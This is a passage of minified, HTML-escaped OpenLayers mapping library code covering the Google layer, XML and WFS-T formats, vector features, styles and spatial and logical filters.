this.dragObject=a.getDragObject():this.dragPanMapObject=null;!1===this.isBaseLayer&amp;&amp;this.setGMapVisibility("none"!==this.div.style.display)},onMapResize:function(){if(this.visibility&amp;&amp;this.mapObject.isLoaded())this.mapObject.checkResize();else{if(!this._resized)var a=this,b=GEvent.addListener(this.mapObject,"load",function(){GEvent.removeListener(b);delete a._resized;a.mapObject.checkResize();a.moveTo(a.map.getCenter(),a.map.getZoom())});this._resized=!0}},setGMapVisibility:function(a){var b=OpenLayers.Layer.Google.cache[this.map.id]; if(b){var c=this.mapObject.getContainer();!0===a?(this.mapObject.setMapType(this.type),c.style.display="",this.termsOfUse.style.left="",this.termsOfUse.style.display="",this.poweredBy.style.display="",b.displayed=this.id):(b.displayed===this.id&amp;&amp;delete b.displayed,b.displayed||(c.style.display="none",this.termsOfUse.style.display="none",this.termsOfUse.style.left="-9999px",this.poweredBy.style.display="none"))}},getMapContainer:function(){return this.mapObject.getContainer()},getMapObjectBoundsFromOLBounds:function(a){var b= null;null!=a&amp;&amp;(b=this.sphericalMercator?this.inverseMercator(a.bottom,a.left):new OpenLayers.LonLat(a.bottom,a.left),a=this.sphericalMercator?this.inverseMercator(a.top,a.right):new OpenLayers.LonLat(a.top,a.right),b=new GLatLngBounds(new GLatLng(b.lat,b.lon),new GLatLng(a.lat,a.lon)));return b},setMapObjectCenter:function(a,b){this.mapObject.setCenter(a,b)},dragPanMapObject:function(a,b){this.dragObject.moveBy(new GSize(-a,b))},getMapObjectLonLatFromMapObjectPixel:function(a){return this.mapObject.fromContainerPixelToLatLng(a)}, getMapObjectPixelFromMapObjectLonLat:function(a){return this.mapObject.fromLatLngToContainerPixel(a)},getMapObjectZoomFromMapObjectBounds:function(a){return this.mapObject.getBoundsZoomLevel(a)},getMapObjectLonLatFromLonLat:function(a,b){var c;this.sphericalMercator?(c=this.inverseMercator(a,b),c=new GLatLng(c.lat,c.lon)):c=new GLatLng(b,a);return c},getMapObjectPixelFromXY:function(a,b){return new GPoint(a,b)}};OpenLayers.Format.XML=OpenLayers.Class(OpenLayers.Format,{namespaces:null,namespaceAlias:null,defaultPrefix:null,readers:{},writers:{},xmldom:null,initialize:function(a){window.ActiveXObject&amp;&amp;(this.xmldom=new ActiveXObject("Microsoft.XMLDOM"));OpenLayers.Format.prototype.initialize.apply(this,[a]);this.namespaces=OpenLayers.Util.extend({},this.namespaces);this.namespaceAlias={};for(var b in this.namespaces)this.namespaceAlias[this.namespaces[b]]=b},destroy:function(){this.xmldom=null;OpenLayers.Format.prototype.destroy.apply(this, arguments)},setNamespace:function(a,b){this.namespaces[a]=b;this.namespaceAlias[b]=a},read:function(a){var b=a.indexOf("&lt;");0&lt;b&amp;&amp;(a=a.substring(b));b=OpenLayers.Util.Try(OpenLayers.Function.bind(function(){var b;b=window.ActiveXObject&amp;&amp;!this.xmldom?new ActiveXObject("Microsoft.XMLDOM"):this.xmldom;b.loadXML(a);return b},this),function(){return(new DOMParser).parseFromString(a,"text/xml")},function(){var b=new XMLHttpRequest;b.open("GET","data:text/xml;charset=utf-8,"+encodeURIComponent(a),!1);b.overrideMimeType&amp;&amp; b.overrideMimeType("text/xml");b.send(null);return b.responseXML});this.keepData&amp;&amp;(this.data=b);return b},write:function(a){if(this.xmldom)a=a.xml;else{var b=new XMLSerializer;if(1==a.nodeType){var c=document.implementation.createDocument("","",null);c.importNode&amp;&amp;(a=c.importNode(a,!0));c.appendChild(a);a=b.serializeToString(c)}else a=b.serializeToString(a)}return a},createElementNS:function(a,b){return this.xmldom?"string"==typeof a?this.xmldom.createNode(1,b,a):this.xmldom.createNode(1,b,""):document.createElementNS(a, b)},createDocumentFragment:function(){return this.xmldom?this.xmldom.createDocumentFragment():document.createDocumentFragment()},createTextNode:function(a){"string"!==typeof a&amp;&amp;(a=String(a));return this.xmldom?this.xmldom.createTextNode(a):document.createTextNode(a)},getElementsByTagNameNS:function(a,b,c){var d=[];if(a.getElementsByTagNameNS)d=a.getElementsByTagNameNS(b,c);else{a=a.getElementsByTagName("*");for(var e,f,g=0,h=a.length;g&lt;h;++g)if(e=a[g],f=e.prefix?e.prefix+":"+c:c,"*"==c||f==e.nodeName)"*"!= b&amp;&amp;b!=e.namespaceURI||d.push(e)}return d},getAttributeNodeNS:function(a,b,c){var d=null;if(a.getAttributeNodeNS)d=a.getAttributeNodeNS(b,c);else{a=a.attributes;for(var e,f,g=0,h=a.length;g&lt;h;++g)if(e=a[g],e.namespaceURI==b&amp;&amp;(f=e.prefix?e.prefix+":"+c:c,f==e.nodeName)){d=e;break}}return d},getAttributeNS:function(a,b,c){var d="";if(a.getAttributeNS)d=a.getAttributeNS(b,c)||"";else if(a=this.getAttributeNodeNS(a,b,c))d=a.nodeValue;return d},getChildValue:function(a,b){var c=b||"";if(a)for(var d=a.firstChild;d;d= d.nextSibling)switch(d.nodeType){case 3:case 4:c+=d.nodeValue}return c},isSimpleContent:function(a){var b=!0;for(a=a.firstChild;a;a=a.nextSibling)if(1===a.nodeType){b=!1;break}return b},contentType:function(a){var b=!1,c=!1,d=OpenLayers.Format.XML.CONTENT_TYPE.EMPTY;for(a=a.firstChild;a;a=a.nextSibling){switch(a.nodeType){case 1:c=!0;break;case 8:break;default:b=!0}if(c&amp;&amp;b)break}if(c&amp;&amp;b)d=OpenLayers.Format.XML.CONTENT_TYPE.MIXED;else{if(c)return OpenLayers.Format.XML.CONTENT_TYPE.COMPLEX;if(b)return OpenLayers.Format.XML.CONTENT_TYPE.SIMPLE}return d}, hasAttributeNS:function(a,b,c){var d=!1;return d=a.hasAttributeNS?a.hasAttributeNS(b,c):!!this.getAttributeNodeNS(a,b,c)},setAttributeNS:function(a,b,c,d){if(a.setAttributeNS)a.setAttributeNS(b,c,d);else if(this.xmldom)b?(b=a.ownerDocument.createNode(2,c,b),b.nodeValue=d,a.setAttributeNode(b)):a.setAttribute(c,d);else throw"setAttributeNS not implemented";},createElementNSPlus:function(a,b){b=b||{};var c=b.uri||this.namespaces[b.prefix];c||(c=a.indexOf(":"),c=this.namespaces[a.substring(0,c)]);c|| (c=this.namespaces[this.defaultPrefix]);c=this.createElementNS(c,a);b.attributes&amp;&amp;this.setAttributes(c,b.attributes);var d=b.value;null!=d&amp;&amp;c.appendChild(this.createTextNode(d));return c},setAttributes:function(a,b){var c,d,e;for(e in b)null!=b[e]&amp;&amp;b[e].toString&amp;&amp;(c=b[e].toString(),d=this.namespaces[e.substring(0,e.indexOf(":"))]||null,this.setAttributeNS(a,d,e,c))},readNode:function(a,b){b||(b={});var c=this.readers[a.namespaceURI?this.namespaceAlias[a.namespaceURI]:this.defaultPrefix];if(c){var d= a.localName||a.nodeName.split(":").pop();(c=c[d]||c["*"])&amp;&amp;c.apply(this,[a,b])}return b},readChildNodes:function(a,b){b||(b={});for(var c=a.childNodes,d,e=0,f=c.length;e&lt;f;++e)d=c[e],1==d.nodeType&amp;&amp;this.readNode(d,b);return b},writeNode:function(a,b,c){var d,e=a.indexOf(":");0&lt;e?(d=a.substring(0,e),a=a.substring(e+1)):d=c?this.namespaceAlias[c.namespaceURI]:this.defaultPrefix;b=this.writers[d][a].apply(this,[b]);c&amp;&amp;c.appendChild(b);return b},getChildEl:function(a,b,c){return a&amp;&amp;this.getThisOrNextEl(a.firstChild, b,c)},getNextEl:function(a,b,c){return a&amp;&amp;this.getThisOrNextEl(a.nextSibling,b,c)},getThisOrNextEl:function(a,b,c){a:for(;a;a=a.nextSibling)switch(a.nodeType){case 1:if(!(b&amp;&amp;b!==(a.localName||a.nodeName.split(":").pop())||c&amp;&amp;c!==a.namespaceURI))break a;a=null;break a;case 3:if(/^\s*$/.test(a.nodeValue))break;case 4:case 6:case 12:case 10:case 11:a=null;break a}return a||null},lookupNamespaceURI:function(a,b){var c=null;if(a)if(a.lookupNamespaceURI)c=a.lookupNamespaceURI(b);else a:switch(a.nodeType){case 1:if(null!== a.namespaceURI&amp;&amp;a.prefix===b){c=a.namespaceURI;break a}if(c=a.attributes.length)for(var d,e=0;e&lt;c;++e)if(d=a.attributes[e],"xmlns"===d.prefix&amp;&amp;d.name==="xmlns:"+b){c=d.value||null;break a}else if("xmlns"===d.name&amp;&amp;null===b){c=d.value||null;break a}c=this.lookupNamespaceURI(a.parentNode,b);break a;case 2:c=this.lookupNamespaceURI(a.ownerElement,b);break a;case 9:c=this.lookupNamespaceURI(a.documentElement,b);break a;case 6:case 12:case 10:case 11:break a;default:c=this.lookupNamespaceURI(a.parentNode, b)}return c},getXMLDoc:function(){OpenLayers.Format.XML.document||this.xmldom||(document.implementation&amp;&amp;document.implementation.createDocument?OpenLayers.Format.XML.document=document.implementation.createDocument("","",null):!this.xmldom&amp;&amp;window.ActiveXObject&amp;&amp;(this.xmldom=new ActiveXObject("Microsoft.XMLDOM")));return OpenLayers.Format.XML.document||this.xmldom},CLASS_NAME:"OpenLayers.Format.XML"});OpenLayers.Format.XML.CONTENT_TYPE={EMPTY:0,SIMPLE:1,COMPLEX:2,MIXED:3}; OpenLayers.Format.XML.lookupNamespaceURI=OpenLayers.Function.bind(OpenLayers.Format.XML.prototype.lookupNamespaceURI,OpenLayers.Format.XML.prototype);OpenLayers.Format.XML.document=null;OpenLayers.Format.WFST=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Format.WFST.DEFAULTS);var b=OpenLayers.Format.WFST["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported WFST version: "+a.version;return new b(a)};OpenLayers.Format.WFST.DEFAULTS={version:"1.0.0"};OpenLayers.Feature=OpenLayers.Class({layer:null,id:null,lonlat:null,data:null,marker:null,popupClass:null,popup:null,initialize:function(a,b,c){this.layer=a;this.lonlat=b;this.data=null!=c?c:{};this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")},destroy:function(){null!=this.layer&amp;&amp;null!=this.layer.map&amp;&amp;null!=this.popup&amp;&amp;this.layer.map.removePopup(this.popup);null!=this.layer&amp;&amp;null!=this.marker&amp;&amp;this.layer.removeMarker(this.marker);this.data=this.lonlat=this.id=this.layer=null;null!=this.marker&amp;&amp; (this.destroyMarker(this.marker),this.marker=null);null!=this.popup&amp;&amp;(this.destroyPopup(this.popup),this.popup=null)},onScreen:function(){var a=!1;null!=this.layer&amp;&amp;null!=this.layer.map&amp;&amp;(a=this.layer.map.getExtent().containsLonLat(this.lonlat));return a},createMarker:function(){null!=this.lonlat&amp;&amp;(this.marker=new OpenLayers.Marker(this.lonlat,this.data.icon));return this.marker},destroyMarker:function(){this.marker.destroy()},createPopup:function(a){null!=this.lonlat&amp;&amp;(this.popup||(this.popup=new (this.popupClass? this.popupClass:OpenLayers.Popup.Anchored)(this.id+"_popup",this.lonlat,this.data.popupSize,this.data.popupContentHTML,this.marker?this.marker.icon:null,a)),null!=this.data.overflow&amp;&amp;(this.popup.contentDiv.style.overflow=this.data.overflow),this.popup.feature=this);return this.popup},destroyPopup:function(){this.popup&amp;&amp;(this.popup.feature=null,this.popup.destroy(),this.popup=null)},CLASS_NAME:"OpenLayers.Feature"});OpenLayers.State={UNKNOWN:"Unknown",INSERT:"Insert",UPDATE:"Update",DELETE:"Delete"}; OpenLayers.Feature.Vector=OpenLayers.Class(OpenLayers.Feature,{fid:null,geometry:null,attributes:null,bounds:null,state:null,style:null,url:null,renderIntent:"default",modified:null,initialize:function(a,b,c){OpenLayers.Feature.prototype.initialize.apply(this,[null,null,b]);this.lonlat=null;this.geometry=a?a:null;this.state=null;this.attributes={};b&amp;&amp;(this.attributes=OpenLayers.Util.extend(this.attributes,b));this.style=c?c:null},destroy:function(){this.layer&amp;&amp;(this.layer.removeFeatures(this),this.layer= null);this.modified=this.geometry=null;OpenLayers.Feature.prototype.destroy.apply(this,arguments)},clone:function(){return new OpenLayers.Feature.Vector(this.geometry?this.geometry.clone():null,this.attributes,this.style)},onScreen:function(a){var b=!1;this.layer&amp;&amp;this.layer.map&amp;&amp;(b=this.layer.map.getExtent(),a?(a=this.geometry.getBounds(),b=b.intersectsBounds(a)):b=b.toGeometry().intersects(this.geometry));return b},getVisibility:function(){return!(this.style&amp;&amp;"none"==this.style.display||!this.layer|| this.layer&amp;&amp;this.layer.styleMap&amp;&amp;"none"==this.layer.styleMap.createSymbolizer(this,this.renderIntent).display||this.layer&amp;&amp;!this.layer.getVisibility())},createMarker:function(){return null},destroyMarker:function(){},createPopup:function(){return null},atPoint:function(a,b,c){var d=!1;this.geometry&amp;&amp;(d=this.geometry.atPoint(a,b,c));return d},destroyPopup:function(){},move:function(a){if(this.layer&amp;&amp;this.geometry.move){a="OpenLayers.LonLat"==a.CLASS_NAME?this.layer.getViewPortPxFromLonLat(a):a;var b= this.layer.getViewPortPxFromLonLat(this.geometry.getBounds().getCenterLonLat()),c=this.layer.map.getResolution();this.geometry.move(c*(a.x-b.x),c*(b.y-a.y));this.layer.drawFeature(this);return b}},toState:function(a){if(a==OpenLayers.State.UPDATE)switch(this.state){case OpenLayers.State.UNKNOWN:case OpenLayers.State.DELETE:this.state=a}else if(a==OpenLayers.State.INSERT)switch(this.state){case OpenLayers.State.UNKNOWN:break;default:this.state=a}else if(a==OpenLayers.State.DELETE)switch(this.state){case OpenLayers.State.UNKNOWN:case OpenLayers.State.UPDATE:this.state= a}else a==OpenLayers.State.UNKNOWN&amp;&amp;(this.state=a)},CLASS_NAME:"OpenLayers.Feature.Vector"}); OpenLayers.Feature.Vector.style={"default":{fillColor:"#ee9900",fillOpacity:0.4,hoverFillColor:"white",hoverFillOpacity:0.8,strokeColor:"#ee9900",strokeOpacity:1,strokeWidth:1,strokeLinecap:"round",strokeDashstyle:"solid",hoverStrokeColor:"red",hoverStrokeOpacity:1,hoverStrokeWidth:0.2,pointRadius:6,hoverPointRadius:1,hoverPointUnit:"%",pointerEvents:"visiblePainted",cursor:"inherit",fontColor:"#000000",labelAlign:"cm",labelOutlineColor:"white",labelOutlineWidth:3},select:{fillColor:"blue",fillOpacity:0.4, hoverFillColor:"white",hoverFillOpacity:0.8,strokeColor:"blue",strokeOpacity:1,strokeWidth:2,strokeLinecap:"round",strokeDashstyle:"solid",hoverStrokeColor:"red",hoverStrokeOpacity:1,hoverStrokeWidth:0.2,pointRadius:6,hoverPointRadius:1,hoverPointUnit:"%",pointerEvents:"visiblePainted",cursor:"pointer",fontColor:"#000000",labelAlign:"cm",labelOutlineColor:"white",labelOutlineWidth:3},temporary:{fillColor:"#66cccc",fillOpacity:0.2,hoverFillColor:"white",hoverFillOpacity:0.8,strokeColor:"#66cccc",strokeOpacity:1, strokeLinecap:"round",strokeWidth:2,strokeDashstyle:"solid",hoverStrokeColor:"red",hoverStrokeOpacity:1,hoverStrokeWidth:0.2,pointRadius:6,hoverPointRadius:1,hoverPointUnit:"%",pointerEvents:"visiblePainted",cursor:"inherit",fontColor:"#000000",labelAlign:"cm",labelOutlineColor:"white",labelOutlineWidth:3},"delete":{display:"none"}};OpenLayers.Style=OpenLayers.Class({id:null,name:null,title:null,description:null,layerName:null,isDefault:!1,rules:null,context:null,defaultStyle:null,defaultsPerSymbolizer:!1,propertyStyles:null,initialize:function(a,b){OpenLayers.Util.extend(this,b);this.rules=[];b&amp;&amp;b.rules&amp;&amp;this.addRules(b.rules);this.setDefaultStyle(a||OpenLayers.Feature.Vector.style["default"]);this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")},destroy:function(){for(var a=0,b=this.rules.length;a&lt;b;a++)this.rules[a].destroy(), this.rules[a]=null;this.defaultStyle=this.rules=null},createSymbolizer:function(a){for(var b=this.defaultsPerSymbolizer?{}:this.createLiterals(OpenLayers.Util.extend({},this.defaultStyle),a),c=this.rules,d,e=[],f=!1,g=0,h=c.length;g&lt;h;g++)d=c[g],d.evaluate(a)&amp;&amp;(d instanceof OpenLayers.Rule&amp;&amp;d.elseFilter?e.push(d):(f=!0,this.applySymbolizer(d,b,a)));if(!1==f&amp;&amp;0&lt;e.length)for(f=!0,g=0,h=e.length;g&lt;h;g++)this.applySymbolizer(e[g],b,a);0&lt;c.length&amp;&amp;!1==f&amp;&amp;(b.display="none");null!=b.label&amp;&amp;"string"!==typeof b.label&amp;&amp; (b.label=String(b.label));return b},applySymbolizer:function(a,b,c){var d=c.geometry?this.getSymbolizerPrefix(c.geometry):OpenLayers.Style.SYMBOLIZER_PREFIXES[0];a=a.symbolizer[d]||a.symbolizer;!0===this.defaultsPerSymbolizer&amp;&amp;(d=this.defaultStyle,OpenLayers.Util.applyDefaults(a,{pointRadius:d.pointRadius}),!0!==a.stroke&amp;&amp;!0!==a.graphic||OpenLayers.Util.applyDefaults(a,{strokeWidth:d.strokeWidth,strokeColor:d.strokeColor,strokeOpacity:d.strokeOpacity,strokeDashstyle:d.strokeDashstyle,strokeLinecap:d.strokeLinecap}), !0!==a.fill&amp;&amp;!0!==a.graphic||OpenLayers.Util.applyDefaults(a,{fillColor:d.fillColor,fillOpacity:d.fillOpacity}),!0===a.graphic&amp;&amp;OpenLayers.Util.applyDefaults(a,{pointRadius:this.defaultStyle.pointRadius,externalGraphic:this.defaultStyle.externalGraphic,graphicName:this.defaultStyle.graphicName,graphicOpacity:this.defaultStyle.graphicOpacity,graphicWidth:this.defaultStyle.graphicWidth,graphicHeight:this.defaultStyle.graphicHeight,graphicXOffset:this.defaultStyle.graphicXOffset,graphicYOffset:this.defaultStyle.graphicYOffset})); return this.createLiterals(OpenLayers.Util.extend(b,a),c)},createLiterals:function(a,b){var c=OpenLayers.Util.extend({},b.attributes||b.data);OpenLayers.Util.extend(c,this.context);for(var d in this.propertyStyles)a[d]=OpenLayers.Style.createLiteral(a[d],c,b,d);return a},findPropertyStyles:function(){var a={};this.addPropertyStyles(a,this.defaultStyle);for(var b=this.rules,c,d,e=0,f=b.length;e&lt;f;e++){c=b[e].symbolizer;for(var g in c)if(d=c[g],"object"==typeof d)this.addPropertyStyles(a,d);else{this.addPropertyStyles(a, c);break}}return a},addPropertyStyles:function(a,b){var c,d;for(d in b)c=b[d],"string"==typeof c&amp;&amp;c.match(/\$\{\w+\}/)&amp;&amp;(a[d]=!0);return a},addRules:function(a){Array.prototype.push.apply(this.rules,a);this.propertyStyles=this.findPropertyStyles()},setDefaultStyle:function(a){this.defaultStyle=a;this.propertyStyles=this.findPropertyStyles()},getSymbolizerPrefix:function(a){for(var b=OpenLayers.Style.SYMBOLIZER_PREFIXES,c=0,d=b.length;c&lt;d;c++)if(-1!=a.CLASS_NAME.indexOf(b[c]))return b[c]},clone:function(){var a= OpenLayers.Util.extend({},this);if(this.rules){a.rules=[];for(var b=0,c=this.rules.length;b&lt;c;++b)a.rules.push(this.rules[b].clone())}a.context=this.context&amp;&amp;OpenLayers.Util.extend({},this.context);b=OpenLayers.Util.extend({},this.defaultStyle);return new OpenLayers.Style(b,a)},CLASS_NAME:"OpenLayers.Style"});OpenLayers.Style.createLiteral=function(a,b,c,d){"string"==typeof a&amp;&amp;-1!=a.indexOf("${")&amp;&amp;(a=OpenLayers.String.format(a,b,[c,d]),a=isNaN(a)||!a?a:parseFloat(a));return a}; OpenLayers.Style.SYMBOLIZER_PREFIXES=["Point","Line","Polygon","Text","Raster"];OpenLayers.Filter=OpenLayers.Class({initialize:function(a){OpenLayers.Util.extend(this,a)},destroy:function(){},evaluate:function(a){return!0},clone:function(){return null},toString:function(){return OpenLayers.Format&amp;&amp;OpenLayers.Format.CQL?OpenLayers.Format.CQL.prototype.write(this):Object.prototype.toString.call(this)},CLASS_NAME:"OpenLayers.Filter"});OpenLayers.Filter.Spatial=OpenLayers.Class(OpenLayers.Filter,{type:null,property:null,value:null,distance:null,distanceUnits:null,evaluate:function(a){var b=!1;switch(this.type){case OpenLayers.Filter.Spatial.BBOX:case OpenLayers.Filter.Spatial.INTERSECTS:if(a.geometry){var c=this.value;"OpenLayers.Bounds"==this.value.CLASS_NAME&amp;&amp;(c=this.value.toGeometry());a.geometry.intersects(c)&amp;&amp;(b=!0)}break;default:throw Error("evaluate is not implemented for this filter type.");}return b},clone:function(){var a= OpenLayers.Util.applyDefaults({value:this.value&amp;&amp;this.value.clone&amp;&amp;this.value.clone()},this);return new OpenLayers.Filter.Spatial(a)},CLASS_NAME:"OpenLayers.Filter.Spatial"});OpenLayers.Filter.Spatial.BBOX="BBOX";OpenLayers.Filter.Spatial.INTERSECTS="INTERSECTS";OpenLayers.Filter.Spatial.DWITHIN="DWITHIN";OpenLayers.Filter.Spatial.WITHIN="WITHIN";OpenLayers.Filter.Spatial.CONTAINS="CONTAINS";OpenLayers.Filter.FeatureId=OpenLayers.Class(OpenLayers.Filter,{fids:null,type:"FID",initialize:function(a){this.fids=[];OpenLayers.Filter.prototype.initialize.apply(this,[a])},evaluate:function(a){for(var b=0,c=this.fids.length;b&lt;c;b++)if((a.fid||a.id)==this.fids[b])return!0;return!1},clone:function(){var a=new OpenLayers.Filter.FeatureId;OpenLayers.Util.extend(a,this);a.fids=this.fids.slice();return a},CLASS_NAME:"OpenLayers.Filter.FeatureId"});OpenLayers.Format.WFST.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",wfs:"http://www.opengis.net/wfs",gml:"http://www.opengis.net/gml",ogc:"http://www.opengis.net/ogc",ows:"http://www.opengis.net/ows"},defaultPrefix:"wfs",version:null,schemaLocations:null,srsName:null,extractAttributes:!0,xy:!0,stateName:null,initialize:function(a){this.stateName={};this.stateName[OpenLayers.State.INSERT]="wfs:Insert";this.stateName[OpenLayers.State.UPDATE]= "wfs:Update";this.stateName[OpenLayers.State.DELETE]="wfs:Delete";OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},getSrsName:function(a,b){var c=b&amp;&amp;b.srsName;c||(c=a&amp;&amp;a.layer?a.layer.projection.getCode():this.srsName);return c},read:function(a,b){b=b||{};OpenLayers.Util.applyDefaults(b,{output:"features"});"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var c={};a&amp;&amp;this.readNode(a,c,!0);c.features&amp;&amp;"features"===b.output&amp;&amp; (c=c.features);return c},readers:{wfs:{FeatureCollection:function(a,b){b.features=[];this.readChildNodes(a,b)}}},write:function(a,b){var c=this.writeNode("wfs:Transaction",{features:a,options:b}),d=this.schemaLocationAttr();d&amp;&amp;this.setAttributeNS(c,this.namespaces.xsi,"xsi:schemaLocation",d);return OpenLayers.Format.XML.prototype.write.apply(this,[c])},writers:{wfs:{GetFeature:function(a){var b=this.createElementNSPlus("wfs:GetFeature",{attributes:{service:"WFS",version:this.version,handle:a&amp;&amp;a.handle, outputFormat:a&amp;&amp;a.outputFormat,maxFeatures:a&amp;&amp;a.maxFeatures,"xsi:schemaLocation":this.schemaLocationAttr(a)}});if("string"==typeof this.featureType)this.writeNode("Query",a,b);else for(var c=0,d=this.featureType.length;c&lt;d;c++)a.featureType=this.featureType[c],this.writeNode("Query",a,b);return b},Transaction:function(a){a=a||{};var b=a.options||{},c=this.createElementNSPlus("wfs:Transaction",{attributes:{service:"WFS",version:this.version,handle:b.handle}}),d,e=a.features;if(e){!0===b.multi&amp;&amp;OpenLayers.Util.extend(this.geometryTypes, {"OpenLayers.Geometry.Point":"MultiPoint","OpenLayers.Geometry.LineString":!0===this.multiCurve?"MultiCurve":"MultiLineString","OpenLayers.Geometry.Polygon":!0===this.multiSurface?"MultiSurface":"MultiPolygon"});var f,g;a=0;for(d=e.length;a&lt;d;++a)g=e[a],(f=this.stateName[g.state])&amp;&amp;this.writeNode(f,{feature:g,options:b},c);!0===b.multi&amp;&amp;this.setGeometryTypes()}if(b.nativeElements)for(a=0,d=b.nativeElements.length;a&lt;d;++a)this.writeNode("wfs:Native",b.nativeElements[a],c);return c},Native:function(a){return this.createElementNSPlus("wfs:Native", {attributes:{vendorId:a.vendorId,safeToIgnore:a.safeToIgnore},value:a.value})},Insert:function(a){var b=a.feature;a=a.options;a=this.createElementNSPlus("wfs:Insert",{attributes:{handle:a&amp;&amp;a.handle}});this.srsName=this.getSrsName(b);this.writeNode("feature:_typeName",b,a);return a},Update:function(a){var b=a.feature;a=a.options;a=this.createElementNSPlus("wfs:Update",{attributes:{handle:a&amp;&amp;a.handle,typeName:(this.featureNS?this.featurePrefix+":":"")+this.featureType}});this.featureNS&amp;&amp;a.setAttribute("xmlns:"+ this.featurePrefix,this.featureNS);var c=b.modified;null===this.geometryName||c&amp;&amp;void 0===c.geometry||(this.srsName=this.getSrsName(b),this.writeNode("Property",{name:this.geometryName,value:b.geometry},a));for(var d in b.attributes)void 0===b.attributes[d]||c&amp;&amp;c.attributes&amp;&amp;(!c.attributes||void 0===c.attributes[d])||this.writeNode("Property",{name:d,value:b.attributes[d]},a);this.writeNode("ogc:Filter",new OpenLayers.Filter.FeatureId({fids:[b.fid]}),a);return a},Property:function(a){var b=this.createElementNSPlus("wfs:Property"); this.writeNode("Name",a.name,b);null!==a.value&amp;&amp;this.writeNode("Value",a.value,b);return b},Name:function(a){return this.createElementNSPlus("wfs:Name",{value:a})},Value:function(a){var b;a instanceof OpenLayers.Geometry?(b=this.createElementNSPlus("wfs:Value"),a=this.writeNode("feature:_geometry",a).firstChild,b.appendChild(a)):b=this.createElementNSPlus("wfs:Value",{value:a});return b},Delete:function(a){var b=a.feature;a=a.options;a=this.createElementNSPlus("wfs:Delete",{attributes:{handle:a&amp;&amp; a.handle,typeName:(this.featureNS?this.featurePrefix+":":"")+this.featureType}});this.featureNS&amp;&amp;a.setAttribute("xmlns:"+this.featurePrefix,this.featureNS);this.writeNode("ogc:Filter",new OpenLayers.Filter.FeatureId({fids:[b.fid]}),a);return a}}},schemaLocationAttr:function(a){a=OpenLayers.Util.extend({featurePrefix:this.featurePrefix,schema:this.schema},a);var b=OpenLayers.Util.extend({},this.schemaLocations);a.schema&amp;&amp;(b[a.featurePrefix]=a.schema);a=[];var c,d;for(d in b)(c=this.namespaces[d])&amp;&amp; a.push(c+" "+b[d]);return a.join(" ")||void 0},setFilterProperty:function(a){if(a.filters)for(var b=0,c=a.filters.length;b&lt;c;++b)OpenLayers.Format.WFST.v1.prototype.setFilterProperty.call(this,a.filters[b]);else a instanceof OpenLayers.Filter.Spatial&amp;&amp;!a.property&amp;&amp;(a.property=this.geometryName)},CLASS_NAME:"OpenLayers.Format.WFST.v1"});OpenLayers.Format.OGCExceptionReport=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ogc:"http://www.opengis.net/ogc"},regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},defaultPrefix:"ogc",read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b={exceptionReport:null};a.documentElement&amp;&amp;(this.readChildNodes(a,b),null===b.exceptionReport&amp;&amp;(b=(new OpenLayers.Format.OWSCommon).read(a)));return b},readers:{ogc:{ServiceExceptionReport:function(a, b){b.exceptionReport={exceptions:[]};this.readChildNodes(a,b.exceptionReport)},ServiceException:function(a,b){var c={code:a.getAttribute("code"),locator:a.getAttribute("locator"),text:this.getChildValue(a)};b.exceptions.push(c)}}},CLASS_NAME:"OpenLayers.Format.OGCExceptionReport"});OpenLayers.Format.XML.VersionedOGC=OpenLayers.Class(OpenLayers.Format.XML,{defaultVersion:null,version:null,profile:null,allowFallback:!1,name:null,stringifyOutput:!1,parser:null,initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);a=this.CLASS_NAME;this.name=a.substring(a.lastIndexOf(".")+1)},getVersion:function(a,b){var c;a?(c=this.version,c||(c=a.getAttribute("version"),c||(c=this.defaultVersion))):c=b&amp;&amp;b.version||this.version||this.defaultVersion;return c},getParser:function(a){a= a||this.defaultVersion;var b=this.profile?"_"+this.profile:"";if(!this.parser||this.parser.VERSION!=a){var c=OpenLayers.Format[this.name]["v"+a.replace(/\./g,"_")+b];if(!c&amp;&amp;(""!==b&amp;&amp;this.allowFallback&amp;&amp;(b="",c=OpenLayers.Format[this.name]["v"+a.replace(/\./g,"_")]),!c))throw"Can't find a "+this.name+" parser for version "+a+b;this.parser=new c(this.options)}return this.parser},write:function(a,b){var c=this.getVersion(null,b);this.parser=this.getParser(c);c=this.parser.write(a,b);return!1===this.stringifyOutput? c:OpenLayers.Format.XML.prototype.write.apply(this,[c])},read:function(a,b){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var c=this.getVersion(a.documentElement);this.parser=this.getParser(c);var d=this.parser.read(a,b),e=this.parser.errorProperty||null;null!==e&amp;&amp;void 0===d[e]&amp;&amp;(e=new OpenLayers.Format.OGCExceptionReport,d.error=e.read(a));d.version=c;return d},CLASS_NAME:"OpenLayers.Format.XML.VersionedOGC"});OpenLayers.Filter.Logical=OpenLayers.Class(OpenLayers.Filter,{filters:null,type:null,initialize:function(a){this.filters=[];OpenLayers.Filter.prototype.initialize.apply(this,[a])},destroy:function(){this.filters=null;OpenLayers.Filter.prototype.destroy.apply(this)},evaluate:function(a){var b,c;switch(this.type){case OpenLayers.Filter.Logical.AND:b=0;for(c=this.filters.length;b&lt;c;b++)if(!1==this.filters[b].evaluate(a))return!1;return!0;case OpenLayers.Filter.Logical.OR:b=0;for(c=this.filters.length;b&lt; c;b++)if(!0==this.filters[b].evaluate(a))return!0;return!1;case OpenLayers.Filter.Logical.NOT:return!this.filters[0].evaluate(a)}},clone:function(){for(var a=[],b=0,c=this.filters.length;b&lt;c;++b)a.push(this.filters[b].clone());return new 